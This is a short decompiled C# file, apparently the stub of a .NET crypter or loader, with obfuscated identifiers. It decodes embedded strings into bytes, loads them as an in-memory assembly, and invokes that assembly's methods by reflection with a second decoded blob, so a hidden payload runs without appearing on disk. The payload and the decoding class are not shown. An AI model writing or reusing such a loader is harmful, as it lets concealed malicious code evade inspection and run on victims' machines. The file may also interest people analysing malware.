using System;
using System.Reflection;

public class GClass0
{
	private static object[] object_0 = null;

	private static Assembly assembly_0 = AppDomain.CurrentDomain.Load(smethod_0("rNHDp"));

	[STAThread]
	public static void Main()
	{
		smethod_1("Booya", new object[2]
		{
			smethod_0("OXKil"),
			0
		});
	}

	private static byte[] smethod_0(string string_0)
	{
		return Class0.smethod_3(Class0.smethod_1(string_0));
	}

	private static object smethod_1(string string_0, object[] object_1)
	{
		object_0 = object_1;
		MethodInfo[] methods = assembly_0.GetTypes()[0].GetMethods();
		int num = 0;
		object result;
		while (true)
		{
			if (num < methods.Length)
			{
				MethodInfo methodInfo = methods[num];
				try
				{
					result = methodInfo.Invoke(null, object_0);
				}
				catch
				{
					goto IL_0032;
				}
				break;
			}
			return null;
			IL_0032:
			num++;
		}
		return result;
	}
}
